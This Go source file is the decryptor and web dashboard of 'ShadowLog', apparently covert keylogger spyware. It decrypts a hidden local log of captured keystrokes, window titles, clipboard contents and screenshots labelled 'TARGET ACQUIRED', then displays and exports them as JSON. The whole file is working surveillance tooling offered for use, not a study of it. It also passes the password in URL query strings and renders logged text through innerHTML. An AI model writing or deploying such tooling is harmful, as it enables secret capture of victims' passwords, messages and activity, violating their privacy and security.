package main

import (
	"bufio"
	"context"
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"html/template"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"syscall"
	"time"

	"shadowlog/config"
	"strings"
	"sync"
)

var (
	lastHeartbeat = time.Now()
	heartbeatMu   sync.Mutex
	autoUnlocked  bool
)

type LogEntry struct {
	Timestamp string
	Window    string
	Key       string
}

func main() {
	// ShadowLog Decryptor v4.0: Smart auto-detection + manual password fallback.
	// Automatically finds and decrypts the hidden local log file.

	logPath := config.GetStoragePath()

	// SMART AUTO-DETECT: Try to decrypt config using MachineGuid first.
	// This works when the user didn't set a custom password and is on the same machine.
	if _, err := config.LoadConfig(); err == nil {
		autoUnlocked = true
		fmt.Println("[+] Auto-detection successful: MachineGuid-based decryption verified.")
	} else {
		fmt.Println("[*] Auto-detection failed (custom password required or different machine).")
	}

	// Start local server for the UI.
	mux := http.NewServeMux()
	server := &http.Server{Addr: ":58292", Handler: mux}

	// Watchdog goroutine to shutdown if heartbeat stops
	go func() {
		for {
			time.Sleep(5 * time.Second)
			heartbeatMu.Lock()
			elapsed := time.Since(lastHeartbeat)
			heartbeatMu.Unlock()
			if elapsed > 12*time.Second {
				fmt.Println("No heartbeat received for 12s. Shutting down Decryptor...")
				server.Shutdown(context.Background())
				return
			}
		}
	}()

	mux.HandleFunc("/heartbeat", func(w http.ResponseWriter, r *http.Request) {
		heartbeatMu.Lock()
		lastHeartbeat = time.Now()
		heartbeatMu.Unlock()
		w.WriteHeader(http.StatusOK)
	})

	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		pwd := r.URL.Query().Get("pwd")
		autoMode := r.URL.Query().Get("auto")
		errorMsg := ""

		// AUTO-UNLOCK PATH: MachineGuid-based (same machine, no custom password).
		if autoUnlocked && pwd == "" {
			entries := loadLogs(logPath)
			tmpl := template.Must(template.New("decryptor").Funcs(template.FuncMap{
				"split": func(s, sep string) []string {
					return strings.Split(s, sep)
				},
			}).Parse(htmlContent))
			tmpl.Execute(w, map[string]interface{}{
				"Entries": entries,
				"Count":   len(entries),
				"Path":    logPath,
				"AutoMode": true,
			})
			return
		}

		// MANUAL AUTO-DETECT: User clicked "Try Auto-Detect" on the lock screen.
		if autoMode == "1" {
			config.SetEncryptionPassword("")
			if _, err := config.LoadConfig(); err == nil {
				autoUnlocked = true
				http.Redirect(w, r, "/", http.StatusFound)
				return
			}
			errorMsg = "Auto-detection failed. This machine's GUID does not match the encryption key. Please enter your custom password."
		}

		// PASSWORD PATH: User entered a password.
		if pwd != "" {
			config.SetEncryptionPassword(pwd)
			_, err := config.LoadConfig()
			if err != nil {
				errorMsg = "Decryption failed. The password does not match the key used during setup. Ensure you are entering the exact encryption password configured during initial deployment."
				pwd = ""
			}
		}

		// If no valid password accepted, show Lock screen.
		if pwd == "" {
			// Check if the data file even exists.
			fileExists := true
			if _, err := os.Stat(logPath); os.IsNotExist(err) {
				fileExists = false
				errorMsg = "No telemetry data file found at the expected path. Ensure ShadowLog has been deployed and has generated logs on this machine."
			}

			tmpl := template.Must(template.New("lock").Parse(lockHtmlContent))
			tmpl.Execute(w, map[string]interface{}{
				"Error":      errorMsg,
				"FileExists": fileExists,
				"LogPath":    logPath,
			})
			return
		}

		// Password accepted — render the main dashboard.
		entries := loadLogs(logPath)
		tmpl := template.Must(template.New("decryptor").Funcs(template.FuncMap{
			"split": func(s, sep string) []string {
				return strings.Split(s, sep)
			},
		}).Parse(htmlContent))
		tmpl.Execute(w, map[string]interface{}{
			"Entries":  entries,
			"Count":    len(entries),
			"Path":     logPath,
			"Password": pwd,
		})
	})

	// Handle shutdown
	mux.HandleFunc("/shutdown", func(w http.ResponseWriter, r *http.Request) {
		fmt.Fprint(w, "ShadowLog Decryptor is shutting down...")
		go func() {
			time.Sleep(1 * time.Second)
			server.Shutdown(context.Background())
		}()
	})

	// Handle data export (JSON)
	mux.HandleFunc("/export", func(w http.ResponseWriter, r *http.Request) {
		pwd := r.URL.Query().Get("pwd")
		if pwd == "" {
			http.Error(w, "Unauthorized", http.StatusUnauthorized)
			return
		}
		
		config.SetEncryptionPassword(pwd)
		if _, err := config.LoadConfig(); err != nil {
			http.Error(w, "Invalid password", http.StatusForbidden)
			return
		}

		entries := loadLogs(logPath)
		w.Header().Set("Content-Type", "application/json")
		w.Header().Set("Content-Disposition", "attachment; filename=shadowlog_export.json")
		json.NewEncoder(w).Encode(entries)
	})

	fmt.Printf("Starting ShadowLog Decryptor v4.0 at http://localhost:58292\n")
	
	go func() {
		time.Sleep(1 * time.Second)
		openBrowser("http://localhost:58292")
	}()

	if err := server.ListenAndServe(); err != http.ErrServerClosed {
		fmt.Printf("Server error: %v\n", err)
	}
}

func loadLogs(path string) []LogEntry {
	file, err := os.Open(path)
	if err != nil {
		return nil
	}
	defer file.Close()

	var rawEntries []LogEntry
	scanner := bufio.NewScanner(file)
	// IMPORTANT FIX: Increase buffer size for large clipboard/encoded logs (up to 10MB per line)
	buf := make([]byte, 0, 64*1024)
	scanner.Buffer(buf, 10*1024*1024)

	firstLine := true
	for scanner.Scan() {
		if firstLine {
			firstLine = false
			continue
		}
		
		line := scanner.Text()
		if line == "" {
			continue
		}

		data, err := base64.StdEncoding.DecodeString(line)
		if err != nil {
			continue
		}

		decrypted, err := decrypt(data)
		if err != nil {
			continue
		}

		s := string(decrypted)
		// SPLIT BATCHED LOGS: The monitor batches 3+ strokes per line.
		lines := strings.Split(s, "\n")
		for _, rawLine := range lines {
			if rawLine == "" {
				continue
			}
			
			entry := LogEntry{Key: rawLine} 
			
			// Expected format: [TIMESTAMP] [WINDOW] MESSAGE
			if len(rawLine) > 22 && rawLine[0] == '[' && rawLine[20] == ']' {
				entry.Timestamp = rawLine[1:20]
				remaining := rawLine[22:]
				if idx := strings.Index(remaining, "] "); idx != -1 && remaining[0] == '[' {
					entry.Window = remaining[1:idx]
					entry.Key = remaining[idx+2:]
				}
			}
			
			// Detect TARGET ACQUISITION (Screenshots)
			if strings.Contains(entry.Key, "📸 TARGET ACQUIRED") {
				entry.Window = "Surveillance"
			}

			rawEntries = append(rawEntries, entry)
		}
	}

	// Ungrouped return for maximum granularity ("don't limit").
	if len(rawEntries) == 0 {
		return nil
	}

	// Reverse to show newest logs first
	for i, j := 0, len(rawEntries)-1; i < j; i, j = i+1, j-1 {
		rawEntries[i], rawEntries[j] = rawEntries[j], rawEntries[i]
	}

	return rawEntries
}

func decrypt(data []byte) ([]byte, error) {
	key := config.GetEncryptionKey()
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	nonceSize := gcm.NonceSize()
	if len(data) < nonceSize {
		return nil, fmt.Errorf("ciphertext too short")
	}
	nonce, ciphertext := data[:nonceSize], data[nonceSize:]
	return gcm.Open(nil, nonce, ciphertext, nil)
}

func openBrowser(url string) {
	var err error
	switch runtime.GOOS {
	case "windows":
		cmd := exec.Command("rundll32", "url.dll,FileProtocolHandler", url)
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		err = cmd.Start()
	case "linux":
		err = exec.Command("xdg-open", url).Start()
	case "darwin":
		err = exec.Command("open", url).Start()
	}
	if err != nil {
		fmt.Printf("Error opening browser: %v\n", err)
	}
}

const lockHtmlContent = `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Locked | ShadowLog Decryptor v4.0</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <style>
        :root {
            --primary: #0078d4;
            --bg: #050505;
            --card-bg: rgba(20, 20, 20, 0.4);
            --card-border: rgba(255, 255, 255, 0.1);
            --success: #22c55e;
            --warning: #f59e0b;
        }
        body {
            font-family: 'Inter', sans-serif;
            background: var(--bg);
            color: white;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow: hidden;
            margin: 0;
        }
        .mesh {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background-image: 
                radial-gradient(at 0% 0%, rgba(0, 120, 212, 0.15) 0px, transparent 50%),
                radial-gradient(at 100% 100%, rgba(0, 120, 212, 0.05) 0px, transparent 50%);
            z-index: -1;
        }
        .lock-card {
            background: var(--card-bg);
            backdrop-filter: blur(40px);
            border: 1px solid var(--card-border);
            padding: 56px 44px;
            border-radius: 32px;
            width: 100%;
            max-width: 460px;
            text-align: center;
            box-shadow: 0 40px 80px -20px rgba(0,0,0,0.5);
            animation: float 6s ease-in-out infinite;
        }
        @keyframes float {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-10px); }
        }
        .icon-box {
            width: 80px; height: 80px;
            background: rgba(0, 120, 212, 0.1);
            border: 1px solid var(--card-border);
            border-radius: 20px;
            margin: 0 auto 24px;
            display: flex;
            justify-content: center;
            align-items: center;
            color: var(--primary);
        }
        .version-badge {
            display: inline-block;
            background: rgba(0, 120, 212, 0.15);
            color: var(--primary);
            padding: 4px 12px;
            border-radius: 20px;
            font-size: 0.75rem;
            font-weight: 700;
            margin-bottom: 16px;
            letter-spacing: 0.05em;
        }
        h1 { font-size: 1.75rem; font-weight: 800; margin-bottom: 8px; letter-spacing: -0.04em; }
        .subtitle { color: rgba(255,255,255,0.5); font-size: 0.9375rem; margin-bottom: 28px; font-weight: 500; line-height: 1.5; }
        .status-bar {
            display: flex; align-items: center; justify-content: center; gap: 8px;
            margin-bottom: 28px; padding: 10px 16px;
            background: rgba(255,255,255,0.03); border: 1px solid var(--card-border);
            border-radius: 12px; font-size: 0.8125rem;
        }
        .status-dot { width: 8px; height: 8px; border-radius: 50%; flex-shrink: 0; }
        .status-dot.green { background: var(--success); box-shadow: 0 0 8px var(--success); }
        .status-dot.red { background: #ef4444; box-shadow: 0 0 8px #ef4444; }
        .status-text { color: rgba(255,255,255,0.6); font-family: 'Inter', monospace; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
        .input-group { position: relative; margin-bottom: 12px; }
        input {
            width: 100%;
            background: rgba(255,255,255,0.05);
            border: 1px solid var(--card-border);
            border-radius: 16px;
            padding: 18px 48px 18px 24px;
            color: white;
            font-size: 1rem;
            outline: none;
            transition: all 0.3s;
            box-sizing: border-box;
        }
        input:focus { border-color: var(--primary); background: rgba(255,255,255,0.08); box-shadow: 0 0 0 4px rgba(0, 120, 212, 0.1); }
        .toggle-pwd {
            position: absolute; right: 16px; top: 50%; transform: translateY(-50%);
            background: none; border: none; color: rgba(255,255,255,0.4); cursor: pointer;
            padding: 4px; display: flex; transition: color 0.2s;
        }
        .toggle-pwd:hover { color: rgba(255,255,255,0.8); }
        .btn-unlock {
            width: 100%;
            background: var(--primary);
            color: white;
            border: none;
            padding: 18px;
            border-radius: 16px;
            font-weight: 800;
            font-size: 1rem;
            cursor: pointer;
            transition: all 0.3s;
            margin-top: 4px;
        }
        .btn-unlock:hover { transform: translateY(-2px); filter: brightness(1.1); box-shadow: 0 10px 20px -5px rgba(0, 120, 212, 0.4); }
        .divider {
            display: flex; align-items: center; gap: 16px;
            margin: 20px 0; color: rgba(255,255,255,0.25); font-size: 0.8125rem; font-weight: 600;
        }
        .divider::before, .divider::after { content: ''; flex: 1; height: 1px; background: var(--card-border); }
        .btn-auto {
            width: 100%;
            background: rgba(255,255,255,0.05);
            color: rgba(255,255,255,0.7);
            border: 1px solid var(--card-border);
            padding: 16px;
            border-radius: 16px;
            font-weight: 700;
            font-size: 0.9375rem;
            cursor: pointer;
            transition: all 0.3s;
            display: flex; align-items: center; justify-content: center; gap: 10px;
        }
        .btn-auto:hover { background: rgba(255,255,255,0.1); border-color: var(--primary); color: white; transform: translateY(-1px); }
        .error {
            background: rgba(239, 68, 68, 0.1); border: 1px solid rgba(239, 68, 68, 0.2);
            color: #fca5a5; font-size: 0.8125rem; margin-top: 16px; font-weight: 500;
            padding: 12px 16px; border-radius: 12px; line-height: 1.5; text-align: left;
        }
        .hint { color: rgba(255,255,255,0.3); font-size: 0.75rem; margin-top: 16px; line-height: 1.5; }
    </style>
</head>
<body>
    <div class="mesh"></div>
    <div class="lock-card">
        <div class="icon-box">
            <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>
        </div>
        <div class="version-badge">DECRYPTOR v4.0</div>
        <h1>Decrypt Evidence</h1>
        <p class="subtitle">Enter the encryption password configured during ShadowLog deployment.</p>

        <div class="status-bar">
            {{ if .FileExists }}
            <span class="status-dot green"></span>
            <span class="status-text">Data file found: {{ .LogPath }}</span>
            {{ else }}
            <span class="status-dot red"></span>
            <span class="status-text">No data file at expected path</span>
            {{ end }}
        </div>

        <div class="input-group">
            <input type="password" id="pwdInput" placeholder="Encryption Password" onkeyup="if(event.key==='Enter') unlock()">
            <button class="toggle-pwd" onclick="togglePwd()" title="Show/hide password">
                <svg id="eyeIcon" xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle></svg>
            </button>
        </div>
        <button class="btn-unlock" onclick="unlock()">Unlock Session</button>

        <div class="divider">or</div>

        <button class="btn-auto" onclick="window.location.href='/?auto=1'">
            <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M21 2l-2 2m-7.61 7.61a5.5 5.5 0 1 1-7.778 7.778 5.5 5.5 0 0 1 7.777-7.777zm0 0L15.5 7.5m0 0l3 3L22 7l-3-3m-3.5 3.5L19 4"></path></svg>
            Auto-Detect (Same Machine)
        </button>

        {{ if .Error }}<div class="error">{{ .Error }}</div>{{ end }}
        <div class="hint">If no custom password was set during setup, use Auto-Detect on the same machine. For cross-machine decryption, the original encryption password is required.</div>
    </div>
    <script>
        function unlock() {
            const pwd = document.getElementById('pwdInput').value;
            if (pwd) {
                window.location.href = '/?pwd=' + encodeURIComponent(pwd);
            }
        }
        function togglePwd() {
            const inp = document.getElementById('pwdInput');
            inp.type = inp.type === 'password' ? 'text' : 'password';
        }
    </script>
</body>
</html>
`

const htmlContent = `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ShadowLog Decryptor v4.0</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=JetBrains+Mono&display=swap" rel="stylesheet">
    <style>
        :root {
            --primary: #0078d4;
            --primary-glow: rgba(0, 120, 212, 0.3);
            --bg: #050505;
            --card-bg: rgba(20, 20, 20, 0.7);
            --card-border: rgba(255, 255, 255, 0.08);
            --text-main: #ffffff;
            --text-dim: #a1a1a1;
            --accent: #ff4d4d;
        }

        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Inter', sans-serif;
            background-color: var(--bg);
            background-image: 
                radial-gradient(at 0% 0%, rgba(0, 120, 212, 0.1) 0px, transparent 50%),
                radial-gradient(at 100% 100%, rgba(20, 20, 20, 1) 0px, transparent 50%);
            color: var(--text-main);
            min-height: 100vh;
            padding: 48px 24px;
            line-height: 1.6;
        }

        .container { max-width: 1600px; width: 95%; margin: 0 auto; }
        
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 48px;
            background: rgba(255,255,255,0.02);
            padding: 24px 32px;
            border-radius: 24px;
            border: 1px solid var(--card-border);
            backdrop-filter: blur(20px);
        }

        .logo-box {
            display: flex;
            align-items: center;
            gap: 20px;
        }

        .icon {
            width: 56px;
            height: 56px;
            background: linear-gradient(135deg, rgba(0, 120, 212, 0.2), rgba(0, 120, 212, 0.05));
            border: 1px solid var(--card-border);
            border-radius: 16px;
            display: flex;
            justify-content: center;
            align-items: center;
            color: var(--primary);
            box-shadow: 0 10px 30px -10px var(--primary-glow);
        }

        h1 { font-size: 1.5rem; font-weight: 800; letter-spacing: -0.04em; margin-bottom: 2px; }
        .v-badge { display: inline-block; background: rgba(0, 120, 212, 0.15); color: var(--primary); padding: 2px 8px; border-radius: 6px; font-size: 0.7rem; font-weight: 800; margin-left: 8px; letter-spacing: 0.05em; vertical-align: middle; }
        .stats { font-size: 0.8125rem; color: var(--text-dim); display: flex; align-items: center; gap: 12px; font-weight: 500; }
        .path-pill { background: rgba(255,255,255,0.05); padding: 4px 10px; border-radius: 8px; font-family: 'JetBrains Mono', monospace; font-size: 0.75rem; color: var(--primary); border: 1px solid rgba(0, 120, 212, 0.1); }

        .controls {
            margin-bottom: 32px;
        }

        .search-box {
            position: relative;
            width: 100%;
        }
        .search-box input {
            width: 100%;
            background: var(--card-bg);
            border: 1px solid var(--card-border);
            border-radius: 16px;
            padding: 16px 20px 16px 52px;
            color: white;
            font-size: 0.9375rem;
            outline: none;
            transition: all 0.3s;
            backdrop-filter: blur(10px);
        }
        .search-box input:focus { border-color: var(--primary); box-shadow: 0 0 0 4px rgba(0, 120, 212, 0.1); }
        .search-icon { position: absolute; left: 20px; top: 50%; transform: translateY(-50%); color: var(--text-dim); }

        .btn {
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid var(--card-border);
            color: #fff;
            padding: 12px 24px;
            border-radius: 14px;
            text-decoration: none;
            font-weight: 700;
            font-size: 0.875rem;
            transition: all 0.2s;
            cursor: pointer;
            display: inline-flex;
            align-items: center;
            gap: 10px;
        }
        .btn:hover { background: rgba(255, 255, 255, 0.1); transform: translateY(-1px); border-color: var(--primary); }
        
        .log-container {
            display: flex;
            flex-direction: column;
            gap: 16px;
        }

        .log-row {
            display: grid;
            grid-template-columns: 320px 1fr;
            gap: 0;
            background: var(--card-bg);
            backdrop-filter: blur(24px);
            border: 1px solid var(--card-border);
            border-radius: 20px;
            overflow: hidden;
            transition: all 0.3s cubic-bezier(0.16, 1, 0.3, 1);
            animation: slideIn 0.5s cubic-bezier(0.16, 1, 0.3, 1) forwards;
            opacity: 0;
            transform: translateY(10px);
        }

        @keyframes slideIn {
            to { opacity: 1; transform: translateY(0); }
        }

        .log-row:hover {
            border-color: var(--primary);
            box-shadow: 0 20px 40px -10px rgba(0, 0, 0, 0.5);
        }

        .meta-col {
            padding: 24px;
            background: rgba(255, 255, 255, 0.02);
            border-right: 1px solid var(--card-border);
            display: flex;
            flex-direction: column;
            gap: 12px;
        }

        .data-col {
            padding: 24px;
            display: flex;
            flex-direction: column;
            justify-content: center;
        }

        .ts { 
            color: var(--text-dim); 
            font-family: 'JetBrains Mono', monospace; 
            font-size: 0.75rem; 
            font-weight: 600;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        .ts::before {
            content: '';
            width: 6px; height: 6px;
            background: var(--primary);
            border-radius: 50%;
        }
        
        .location-badge {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            background: rgba(0, 120, 212, 0.1);
            border: 1px solid rgba(0, 120, 212, 0.2);
            padding: 6px 12px;
            border-radius: 10px;
            color: var(--primary);
            font-weight: 700;
            font-size: 0.8125rem;
            width: fit-content;
            letter-spacing: -0.01em;
        }

        .location-badge.system {
            background: rgba(255, 77, 77, 0.1);
            border-color: rgba(255, 77, 77, 0.2);
            color: var(--accent);
        }

        .location-badge.surveillance {
            background: rgba(46, 204, 113, 0.1);
            border-color: rgba(46, 204, 113, 0.2);
            color: #2ecc71;
        }

        .win-title {
            font-size: 0.8125rem;
            color: var(--text-dim);
            line-height: 1.5;
            font-weight: 500;
            overflow: hidden;
            display: -webkit-box;
            -webkit-line-clamp: 2;
            -webkit-box-orient: vertical;
        }
        
        .key-data { 
            font-family: 'JetBrains Mono', monospace; 
            color: #fff; 
            line-height: 1.8;
            word-wrap: break-word;
            white-space: pre-wrap;
            font-size: 0.9375rem;
            letter-spacing: -0.02em;
        }

        .special-key {
            background: rgba(255, 255, 255, 0.1);
            color: var(--primary);
            padding: 2px 8px;
            border-radius: 6px;
            font-size: 0.7rem;
            font-weight: 800;
            margin: 0 4px;
            border: 1px solid rgba(255, 255, 255, 0.05);
            text-transform: uppercase;
            box-shadow: 0 2px 4px rgba(0,0,0,0.2);
        }
        
        .empty { padding: 120px 0; text-align: center; color: var(--text-dim); }
        
        @keyframes pulse {
            0% { opacity: 0.4; }
            50% { opacity: 1; }
            100% { opacity: 0.4; }
        }
        .active-dot {
            width: 8px; height: 8px; background: #2ecc71; border-radius: 50%;
            display: inline-block; animation: pulse 2s infinite;
            box-shadow: 0 0 10px #2ecc71;
        }

        /* Hide Scrollbar */
        ::-webkit-scrollbar { width: 8px; }
        ::-webkit-scrollbar-track { background: transparent; }
        ::-webkit-scrollbar-thumb { background: rgba(255,255,255,0.1); border-radius: 4px; }
        ::-webkit-scrollbar-thumb:hover { background: rgba(255,255,255,0.2); }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo-box">
                <div class="icon">
                    <svg xmlns="http://www.w3.org/2000/svg" width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6-8 10-8 10z"></path></svg>
                </div>
                <div>
                    <h1>ShadowLog Decryptor<span class="v-badge">v4.0</span></h1>
                    <div class="stats">
                        <span class="active-dot"></span>
                        {{ .Count }} Forensic Sessions
                        <span class="path-pill">{{ .Path }}</span>
                    </div>
                </div>
            </div>
            <div style="display: flex; gap: 16px;">
                <a href="#" id="exportBtn" class="btn">
                    <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path><polyline points="7 10 12 15 17 10"></polyline><line x1="12" y1="15" x2="12" y2="3"></line></svg>
                    Export Artifacts
                </a>
                <button onclick="window.location.reload()" class="btn">
                    <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M23 4v6h-6"></path><path d="M20.49 15a9 9 0 1 1-2.12-9.36L23 10"></path></svg>
                    Flush Cache
                </button>
            </div>
        </div>

        <div class="controls" style="display: flex; gap: 16px;">
            <div class="search-box">
                <svg class="search-icon" xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line></svg>
                <input type="text" id="searchInput" placeholder="Filter by window title or artifact content..." onkeyup="filterLogs()">
            </div>
        </div>

        <div class="log-container" id="logTable">
            {{ if .Entries }}
            {{ range .Entries }}
            <div class="log-row">
                <div class="meta-col">
                    <span class="ts">{{ .Timestamp }}</span>
                    <div class="location-badge {{ if eq .Window "System" }}system{{ else if eq .Window "Surveillance" }}surveillance{{ end }}">
                        {{ if eq .Window "System" }}
                        <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>
                        CORE SYSTEM
                        {{ else if eq .Window "Surveillance" }}
                        <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"></path><circle cx="12" cy="13" r="4"></circle></svg>
                        ACQUISITION
                        {{ else }}
                        <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="3" width="20" height="14" rx="2" ry="2"></rect><line x1="8" y1="21" x2="16" y2="21"></line><line x1="12" y1="17" x2="12" y2="21"></line></svg>
                        {{ if index (split .Window " - ") 0 }}{{ index (split .Window " - ") 0 }}{{ else }}Background Process{{ end }}
                        {{ end }}
                    </div>
                    {{ if and (ne .Window "System") (ne .Window "Surveillance") }}
                    <span class="win-title" title="{{ .Window }}">
                        {{ if index (split .Window " - ") 1 }}{{ index (split .Window " - ") 1 }}{{ else }}{{ .Window }}{{ end }}
                    </span>
                    {{ end }}
                </div>
                <div class="data-col">
                    <div class="key-data">{{ .Key }}</div>
                </div>
            </div>
            {{ end }}
            {{ else }}
            <div class="empty">
                <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" style="margin-bottom: 24px; opacity: 0.2; color: var(--primary);"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline><circle cx="9" cy="15" r="1"/><circle cx="15" cy="15" r="1"/></svg>
                <p>No telemetry data found in local storage.</p>
                <p style="font-size: 0.875rem; margin-top: 12px; opacity: 0.6; font-weight: 500;">Shadow Log must be active to generate logs.</p>
            </div>
            {{ end }}
        </div>
    </div>

    <script>
        // Heartbeat mechanism to keep server alive
        setInterval(async () => {
            try {
                await fetch('/heartbeat');
            } catch (e) {
                console.log('Server unreachable');
            }
        }, 2000);

        // Update export link with current password
        const urlParams = new URLSearchParams(window.location.search);
        const pwd = urlParams.get('pwd');
        if (pwd) {
            document.getElementById('exportBtn').href = '/export?pwd=' + encodeURIComponent(pwd);
        }

        function filterLogs() {
            const input = document.getElementById('searchInput');
            const filter = input.value.toUpperCase();
            const rows = document.getElementsByClassName('log-row');

            for (let i = 0; i < rows.length; i++) {
                const badge = rows[i].getElementsByClassName('location-badge')[0];
                const title = rows[i].getElementsByClassName('win-title')[0];
                const key = rows[i].getElementsByClassName('key-data')[0];
                
                const badgeText = badge ? badge.textContent : "";
                const titleText = title ? title.textContent : (badgeText.includes("ACQUISITION") ? "ACQUISITION" : "");
                const keyText = key ? key.textContent : "";
                
                const txtValue = badgeText + " " + titleText + " " + keyText;
                if (txtValue.toUpperCase().indexOf(filter) > -1) {
                    rows[i].style.display = "";
                } else {
                    rows[i].style.display = "none";
                }
            }
        }

        // Format special keys to look like tags
        document.querySelectorAll('.key-data').forEach(cell => {
            cell.innerHTML = cell.textContent.replace(/\[(.*?)\]/g, '<span class="special-key">$1</span>');
        });
    </script>
</body>
</html>
`
